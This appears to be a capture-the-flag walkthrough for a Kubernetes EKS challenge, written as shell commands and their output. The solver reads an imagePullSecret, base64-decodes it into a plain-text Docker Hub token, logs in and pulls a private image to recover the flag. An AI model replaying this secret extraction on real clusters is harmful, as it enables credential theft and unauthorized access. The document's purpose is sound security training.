$ kubectl whoami
system:serviceaccount:challenge2:service-account-challenge2


root@wiz-eks-challenge:~# kubectl auth can-i --list
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
secrets                                         []                                    []                 [get]
pods                                            []                                    []                 [list get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]


$ kubectl get pods database-pod-2c9b3a4e -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubernetes.io/psp: eks.privileged
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:32:05Z"
  name: database-pod-2c9b3a4e
  namespace: challenge2
  resourceVersion: "12166896"
  uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
spec:
  containers:
  - image: eksclustergames/base_ext_image
    imagePullPolicy: Always
    name: my-container
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-cq4m2
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  imagePullSecrets:
  - name: registry-pull-secrets-780bab1d
  nodeName: ip-192-168-21-50.us-west-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-cq4m2
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:05Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2023-12-07T19:54:26Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2023-12-07T19:54:26Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2023-11-01T13:32:05Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0
    image: docker.io/eksclustergames/base_ext_image:latest
    imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
    lastState:
      terminated:
        containerID: containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af
        exitCode: 0
        finishedAt: "2023-12-07T19:54:25Z"
        reason: Completed
        startedAt: "2023-11-01T13:32:08Z"
    name: my-container
    ready: true
    restartCount: 1
    started: true
    state:
      running:
        startedAt: "2023-12-07T19:54:26Z"
  hostIP: 192.168.21.50
  phase: Running
  podIP: 192.168.12.173
  podIPs:
  - ip: 192.168.12.173
  qosClass: BestEffort
  startTime: "2023-11-01T13:32:05Z"


$ kubectl get secret registry-pull-secrets-780bab1d -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson


$ echo "eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19" | base64 -d
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}


$ echo "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="
 | base64 -d
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo


$ crane auth login index.docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr
45iYQj8FuCo
2023/12/14 10:35:41 logged in via /home/user/.docker/config.json


$ crane pull eksclustergames/base_ext_image /tmp/image.tar


$ cd /tmp


$ tar -xvf image.tar 
sha256:add093cd268deb7817aee1887b620628211a04e8733d22ab5c910f3b6cc91867
3f4d90098f5b5a6f6a76e9d217da85aa39b2081e30fa1f7d287138d6e7bf0ad7.tar.gz
193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz
manifest.json


$ tar -xvf 193bf7018861e9ee50a4dc330ec5305abeade134d33d27a78ece55bf4c779e06.tar.gz 
etc/
flag.txt
proc/
proc/.wh..wh..opq
sys/
sys/.wh..wh..opq


$ cat flag.txt
wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}
